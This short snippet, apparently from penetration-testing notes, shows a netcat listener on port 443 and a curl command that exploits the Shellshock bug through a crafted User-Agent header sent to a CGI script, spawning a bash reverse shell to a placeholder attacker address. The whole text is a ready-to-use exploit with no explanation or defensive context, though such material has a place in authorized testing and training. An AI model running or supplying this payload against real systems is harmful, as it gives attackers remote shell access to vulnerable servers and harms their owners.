## Example

```
nc -lvnp 443                                                                                                                                                                                                  1 ⨯
listening on [any] 443 ...
```

```
VICTIM_IP=xx.x.x.x
ATTACKER_IP=xxx.xx.x.xx
curl --user-agent "() { ignored;}; /bin/bash -i >& /dev/tcp/$ATTACKER_IP/443 0>&1" http://$VICTIM_IP/cgi-bin/test.sh
```
